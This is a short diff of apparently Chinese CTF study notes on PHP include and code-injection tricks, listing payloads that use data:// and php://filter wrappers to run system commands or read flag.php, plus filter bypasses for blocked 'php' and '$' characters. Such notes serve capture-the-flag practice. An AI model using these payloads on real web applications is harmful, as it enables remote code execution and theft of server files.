@@ -35,11 +35,21 @@
 * c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
 * c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
 
+<br>
+
 当include(c)时：
 * c=data://text/plain,<?php system('tac f*');?>
-* php被过滤的时候
-* ?c=data://text/plain,<?=system("tac fla*")?>
 
+<br>
+
+* php被过滤的时候:
+* ?c=data://text/plain,<?=system("tac fla*")?>
+* include()只会处理<?php>里面的内容
+
+<br>
+
+* $被过滤的时候:
+* ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 
 <br>
 
